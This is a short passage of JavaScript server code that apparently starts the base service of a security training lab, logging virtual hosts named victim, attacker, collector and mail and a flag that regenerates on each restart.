  app.listen(LISTEN_PORT, () => {
    console.log(`[base] DSLTV subclass=${SUBCLASS} listening on :${LISTEN_PORT} (vhosts: victim|attacker|collector|mail .${LAB_DOMAIN})`);
    console.log(`[base] event flag numeric is session-bound and regenerates every restart`);
  });
}

main().catch((e) => { console.error('[base] fatal:', e); process.exit(1); });
